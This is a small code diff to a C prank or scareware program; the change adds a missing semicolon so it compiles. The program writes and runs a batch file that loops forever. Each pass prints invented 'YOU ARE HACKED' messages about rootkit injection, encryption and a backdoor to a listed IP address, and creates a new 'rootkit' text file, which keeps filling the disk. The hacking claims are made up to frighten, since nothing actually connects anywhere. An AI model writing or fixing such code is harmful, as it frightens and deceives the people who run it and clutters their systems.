@@ -17,7 +17,7 @@ int main(int argc, char* argv[])
     fp = fopen(PATH, "w");
     fprintf(fp, "echo off\n:start\necho ==   YOU ARE HACKED   ==\necho INJECTC \%%random\%%/SYS/ROOT . . . DONE\necho MOVEC \%%random\%%/SYS/ROOT->SYS/WIN32 . . . DONE\necho BACKD \%%random\%%/SYS/ROOT->36.162.91.30 . . . DONE\necho ENCRYPTD \%%random\%%/SYS/ROOT . . . DONE\necho STORED \%%random\%%/SYS/ROOT . . . DONE\necho . . . COMPLETED INJECTION OF ROOTKIT>rootkit\%%random\%%.txt\ngoto start");
 
-    fclose(fp)
+    fclose(fp);
 
     system(PATH);
     Sleep(10);
